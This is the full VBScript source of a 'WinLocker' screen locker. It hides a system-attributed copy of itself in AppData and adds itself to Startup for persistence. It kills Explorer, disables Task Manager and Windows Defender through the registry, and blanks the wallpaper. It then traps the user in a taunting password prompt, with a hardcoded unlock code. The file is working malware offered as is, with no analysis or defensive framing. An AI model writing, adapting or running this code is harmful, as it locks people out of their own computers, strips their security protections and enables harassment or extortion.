Set WshShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' === Get self path ===
selfPath = WScript.ScriptFullName
selfName = fso.GetFileName(selfPath)
startupPath = WshShell.SpecialFolders("Startup") & "\win32.vbs" ' Change name here if desired
hiddenPath = WshShell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\win32.vbs"

' === Copy to hidden location ===
If LCase(selfPath) <> LCase(hiddenPath) Then
    fso.CopyFile selfPath, hiddenPath, True
    Set f = fso.GetFile(hiddenPath)
    f.Attributes = f.Attributes + 2 + 4 ' Hidden + System
    WshShell.Run """" & hiddenPath & """", 0, False
    WScript.Quit
End If

' === Add to Startup ===
If Not fso.FileExists(startupPath) Then
    fso.CopyFile selfPath, startupPath
End If

' === Kill explorer ===
WshShell.Run "taskkill /f /im explorer.exe", 0, True

' === Disable Task Manager ===
WshShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD"

' === Disable Defender ===
WshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware", 1, "REG_DWORD"

' === Remove Wallpaper ===
WshShell.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", "", "REG_SZ"
WshShell.Run "RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, True

' === Password Loop ===
Do
    MsgBox "It's WinLocker, you're done!", 48, "LOL"
    x = InputBox("Well, enter the password")
    If x = "fs17" Then
        MsgBox "Done", 64, "fs17"
        WshShell.RegDelete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr"
        WshShell.Run "explorer.exe"
        Exit Do
    Else
        MsgBox "Wrong password", 48, "LOL"
    End If
Loop
